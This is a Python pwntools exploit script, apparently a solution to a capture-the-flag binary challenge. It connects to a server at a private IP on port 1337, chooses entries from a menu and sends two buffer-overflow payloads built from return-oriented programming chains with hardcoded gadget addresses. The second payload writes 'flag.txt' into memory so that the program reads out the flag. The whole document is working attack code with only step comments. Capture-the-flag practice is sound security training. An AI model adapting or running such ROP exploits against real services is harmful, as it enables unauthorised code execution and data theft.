from pwn import *

elf = context.binary = ELF('chall', checksec= False)
payload = cyclic(40)

pop_r14_r15= 0x0000000000401212
pop_rdi= 0x0000000000401210 
pop_rdi_rsi= 0x000000000040121b
bss_loc= 0x0000000000404040
data= 0x0000000000404030
qword= 0x0000000000401217
fun=0x0000000000401040


payload= cyclic(40)
payload += pack(pop_r14_r15)
payload += pack(bss_loc)
payload += b'faddec0a'
payload += pack(qword)
payload += pack(pop_r14_r15)
payload += pack(data)
payload += b'501d0ef0'
payload += pack(qword)
payload += pack(pop_rdi_rsi)
payload += pack(bss_loc)
payload += pack(data)
payload += pack(fun)

io = remote('192.168.108.73', 1337)

# Step 2: Read the initial prompt from the server (you should see the "Select a binary to run" menu)
io.recvuntil(b"Enter your choice: ")


# Step 3: Send the choice '1' to select "chall 1"
io.sendline(b'0')

# Step 4: Ensure the challenge starts and wait for the response (you may need to tweak this based on the output)
response = io.recvuntil(b">")  # Adjust this to match the output of the challenge
print(response)  # Optional: print the response to verify if the challenge is running

# Step 5: Send the exploit payload
io.sendline(payload)

# Step 6: Receive and print the result after sending the payload

io.recvuntil(b"Quit\nEnter your choice: ")

io.sendline(b'1')

payload = cyclic(40)

pop_r14_r15= 0x0000000000401202
pop_rdi= 0x0000000000401200
pop_rdi_rsi= 0x000000000040121b
bss_loc= 0x0000000000404038
data= 0x0000000000404030
qword= 0x0000000000401207
fun=0x0000000000401070


payload= cyclic(40)
payload += pack(pop_r14_r15)
payload += pack(bss_loc)
payload += b'flag.txt'
payload += pack(qword)
payload += pack(pop_rdi)
payload += pack(bss_loc)
payload += pack(fun)

io.sendline(payload)

print(io.recvall(timeout= 5))
io.close()
# Step 7: Close the connection